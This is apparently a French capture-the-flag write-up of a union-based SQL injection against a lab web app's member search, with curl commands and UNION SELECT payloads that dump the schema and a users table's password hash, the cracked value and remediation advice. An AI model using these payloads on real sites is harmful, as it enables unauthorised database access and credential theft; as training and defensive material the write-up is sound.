# Union-Based SQL Injection on Members Search

## Description de la vulnérabilité
L'application web permet de rechercher des membres par leur identifiant via le paramètre `GET` `?page=member&id=`. La validation côté serveur sur le paramètre `id` est inexistante, permettant une concaténation directe de l'entrée utilisateur dans la requête SQL backend (gérée par un serveur MariaDB). L'absence de requêtes préparées ou de nettoyage permet d'injecter des commandes SQL arbitraires via l'opérateur `UNION`.

## Méthode d'exploitation
1. **Détection :** L'injection d'un guillemet simple (`'`) a provoqué une erreur de syntaxe SQL MariaDB brute, confirmant la vulnérabilité.
2. **Cartographie :** L'injection `UNION SELECT 1,2` a confirmé que la requête d'origine extrait exactement 2 colonnes.
3. **Extraction de la structure :** L'interrogation de la table système globale a permis d'obtenir le nom de la table applicative et ses colonnes :

```bash
curl -s "[http://192.168.159.133/index.php?page=member&id=99999%20UNION%20SELECT%20table_name,column_name%20FROM%20information_schema.columns%20WHERE%20table_schema%3Ddatabase%28%29&Submit=Submit](http://192.168.159.133/index.php?page=member&id=99999%20UNION%20SELECT%20table_name,column_name%20FROM%20information_schema.columns%20WHERE%20table_schema%3Ddatabase%28%29&Submit=Submit)"

```

### Requête SQL effectuée

```sql
SELECT firstname, lastname 
FROM users 
WHERE id = 99999 
UNION 
SELECT table_name, column_name 
FROM information_schema.columns 
WHERE table_schema = database();

```

4. **Exfiltration des secrets :** Extraction des données de la table découverte (`users`) via les colonnes cibles `Commentaire` et `countersign` :

```bash
curl -s "[http://192.168.159.133/index.php?page=member&id=99999%20UNION%20SELECT%20Commentaire,countersign%20FROM%20users&Submit=Submit](http://192.168.159.133/index.php?page=member&id=99999%20UNION%20SELECT%20Commentaire,countersign%20FROM%20users&Submit=Submit)"

```

Le hash MD5 exfiltré (`5ff9d0165b4f92b14994e5c685cdce28`) correspond au mot de passe en clair `fortytwo`. Son empreinte SHA256 finale constitue le flag.

## Remédiation

1. **Requêtes préparées :** Utiliser des requêtes SQL paramétrées (ex: PDO `prepare()` et `execute()`) pour empêcher l'interprétation des entrées utilisateur comme du code.
2. **Transtypage strict :** Forcer le paramètre reçu à être un entier numérique strict avant l'exécution de la requête (`intval($_GET['id'])`).
